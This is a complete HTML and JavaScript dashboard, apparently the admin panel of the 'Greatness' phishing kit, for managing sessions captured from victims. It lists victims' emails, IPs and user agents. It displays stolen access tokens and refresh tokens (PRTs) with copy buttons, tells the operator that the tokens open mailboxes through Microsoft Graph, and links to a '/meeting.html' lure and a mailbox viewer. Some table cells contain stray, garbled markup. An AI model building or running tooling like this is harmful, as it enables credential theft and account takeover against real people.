<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Greatness Admin - Session Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #0a0e27; color: #e0e0e0; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid #1e2342; }
        .logo h1 { background: linear-gradient(135deg, #6c63ff, #3b82f6); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #111635; border-radius: 16px; padding: 20px; border: 1px solid #1e2342; }
        .stat-title { font-size: 13px; color: #8b8fbf; margin-bottom: 8px; }
        .stat-value { font-size: 28px; font-weight: 700; }
        .tools-section { background: #111635; border-radius: 16px; padding: 20px; margin-bottom: 30px; }
        .tools-grid { display: flex; gap: 15px; flex-wrap: wrap; }
        .tool-btn { background: #1a1f3e; border: 1px solid #2a2f4e; padding: 10px 20px; border-radius: 10px; color: white; cursor: pointer; }
        .tool-btn:hover { background: #3b82f6; }
        .table-container { background: #111635; border-radius: 16px; padding: 20px; overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; }
        th, td { text-align: left; padding: 12px 8px; border-bottom: 1px solid #1e2342; }
        th { color: #8b8fbf; font-size: 12px; }
        td { font-size: 12px; }
        .btn-view { background: #10b981; border: none; padding: 6px 12px; border-radius: 6px; color: white; cursor: pointer; font-size: 11px; margin: 2px; }
        .btn-mail { background: #8b5cf6; }
        .token-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #111635; border-radius: 16px; padding: 24px; width: 700px; max-width: 90%; z-index: 1000; border: 1px solid #3b82f6; max-height: 80vh; overflow-y: auto; }
        .token-modal pre { background: #0a0e27; padding: 12px; border-radius: 8px; overflow-x: auto; font-size: 10px; word-break: break-all; }
        .overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 999; }
        .loading { text-align: center; padding: 40px; }
        .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #374151; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .copy-token { font-size: 10px; background: #2563eb; border: none; padding: 2px 8px; border-radius: 4px; color: white; cursor: pointer; margin-left: 8px; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="logo"><h1>Greatness Admin</h1><p>Session & Token Manager</p></div>
        <div class="stat-value" id="sessionCount" style="font-size: 14px;">0 Sessions</div>
    </div>

    <div class="stats-grid">
        <div class="stat-card"><div class="stat-title">Total Sessions</div><div class="stat-value" id="totalSessions">0</div></div>
        <div class="stat-card"><div class="stat-title">With PRT</div><div class="stat-value" id="withPRT">0</div></div>
        <div class="stat-card"><div class="stat-title">Total Users</div><div class="stat-value" id="totalUsers">0</div></div>
        <div class="stat-card"><div class="stat-title">Last Capture</div><div class="stat-value" id="lastCapture" style="font-size: 14px;">-</div></div>
    </div>

    <div class="tools-section">
        <div class="tools-grid">
            <button class="tool-btn" id="refreshBtn">🔄 Refresh</button>
            <button class="tool-btn" id="clearBtn">🗑️ Clear All</button>
            <button class="tool-btn" id="addAccountBtn">➕ Add Account</button>
        </div>
    </div>

    <div class="table-container">
        <h3>📋 Captured Sessions</h3>
        <table>
            <thead><tr><th>Email</th><th>IP Address</th><th>User Agent</th><th>PRT</th><th>Captured</th><th>Actions</th></tr></thead>
            <tbody id="sessionsTableBody"><tr><td colspan="6" class="loading"><div class="spinner"></div> Loading...   </div>... </div>?... </div>?... </div>?..</td></tr></tbody>
        </table>
    </div>
</div>

<div class="overlay" id="overlay"></div>
<div class="token-modal" id="tokenModal">
    <h3 id="modalTitle">Token Details</h3>
    <div id="tokenDetails"></div>
    <button class="tool-btn" onclick="closeModal()" style="margin-top: 15px; background:#ef4444;">Close</button>
</div>

<script>
    async function apiCall(endpoint, options = {}) {
        try {
            const response = await fetch(endpoint, { ...options, headers: { 'Content-Type': 'application/json' } });
            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            return await response.json();
        } catch (err) { return null; }
    }

    async function loadSessions() {
        const data = await apiCall('/api/sessions');
        if (data && data.sessions) {
            renderTable(data.sessions);
            updateStats(data.sessions);
            document.getElementById('sessionCount').innerHTML = `${data.sessions.length} Sessions`;
        }
    }

    function renderTable(sessions) {
        const tbody = document.getElementById('sessionsTableBody');
        if (!sessions || sessions.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No sessions. Click "Add Account" to authenticate.   </div>   </div>   </div>   </div>   </div>   </td></tr>';
            return;
        }
        
        tbody.innerHTML = sessions.map(s => `
            <tr>
                <td style="color:#60a5fa;">${escapeHtml(s.email)}</td>
                <td><code>${escapeHtml(s.ip || 'Unknown')}</code></td>
                <td style="max-width:200px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;" title="${escapeHtml(s.userAgent)}">${escapeHtml((s.userAgent || 'Unknown').substring(0, 40))}...</td>
                <td>${s.hasPRT ? '<span style="color:#10b981;">✅ PRT Captured</span>' : '<span style="color:#ef4444;">❌ No PRT</span>'}</td>
                <td>${formatDate(s.capturedAt)}</td>
                <td>
                    <button class="btn-view" onclick="viewTokens('${s.sessionId}')">🔑 View Tokens</button>
                    <button class="btn-view btn-mail" onclick="openMailbox('${s.sessionId}', '${escapeHtml(s.email)}')">📧 Open Mailbox</button>
                 </td>
            </tr>
        `).join('');
    }

    async function viewTokens(sessionId) {
        document.getElementById('tokenModal').style.display = 'block';
        document.getElementById('overlay').style.display = 'block';
        document.getElementById('tokenDetails').innerHTML = '<div class="loading"><div class="spinner"></div> Loading tokens...</div>';
        
        const data = await apiCall(`/api/session/tokens/${sessionId}`);
        
        if (data) {
            document.getElementById('modalTitle').innerHTML = `🔐 Tokens - ${data.email}`;
            document.getElementById('tokenDetails').innerHTML = `
                <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
                <p><strong>Access Token (valid for ${data.expires_in} sec):</strong></p>
                <pre id="accessToken">${escapeHtml(data.access_token)}</pre>
                <button class="copy-token" onclick="copyToken('accessToken')">📋 Copy Access Token</button>
                <p style="margin-top: 15px;"><strong>PRT (Refresh Token):</strong></p>
                <pre id="prtToken">${escapeHtml(data.refresh_token || 'Not captured')}</pre>
                <button class="copy-token" onclick="copyToken('prtToken')">📋 Copy PRT</button>
                <p style="font-size: 11px; color: #f59e0b; margin-top: 15px;">⚠️ These tokens can be used to access the user's mailbox directly</p>
                <p style="font-size: 11px; color: #10b981;">✅ Use the Access Token with Bearer authorization to call Microsoft Graph API</p>
            `;
        }
    }

    function copyToken(elementId) {
        const element = document.getElementById(elementId);
        const text = element.innerText;
        navigator.clipboard.writeText(text);
        alert('✓ Token copied to clipboard!');
    }

    function openMailbox(sessionId, email) {
        window.open(`/mailbox.html?sid=${sessionId}&email=${encodeURIComponent(email)}`, '_blank', 'width=1200,height=800');
    }

    function updateStats(sessions) {
        document.getElementById('totalSessions').innerText = sessions.length;
        const withPRT = sessions.filter(s => s.hasPRT).length;
        document.getElementById('withPRT').innerText = withPRT;
        document.getElementById('totalUsers').innerText = sessions.length;
        if (sessions.length > 0) document.getElementById('lastCapture').innerHTML = formatDate(sessions[0].capturedAt);
    }

    function closeModal() {
        document.getElementById('tokenModal').style.display = 'none';
        document.getElementById('overlay').style.display = 'none';
    }

    function openAddAccount() { 
        window.open('/meeting.html', '_blank', 'width=800,height=900');
        setTimeout(loadSessions, 5000);
    }
    
    async function clearAll() { 
        if(confirm('Clear all sessions?')){ 
            await apiCall('/api/sessions/clear',{method:'DELETE'}); 
            loadSessions(); 
        } 
    }
    
    function formatDate(d){ return d ? new Date(d).toLocaleString() : 'Unknown'; }
    function escapeHtml(str){ if(!str) return ''; return str.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'})[m]); }

    document.getElementById('refreshBtn').onclick = loadSessions;
    document.getElementById('clearBtn').onclick = clearAll;
    document.getElementById('addAccountBtn').onclick = openAddAccount;
    
    setInterval(loadSessions, 5000);
    loadSessions();
</script>
</body>
</html>
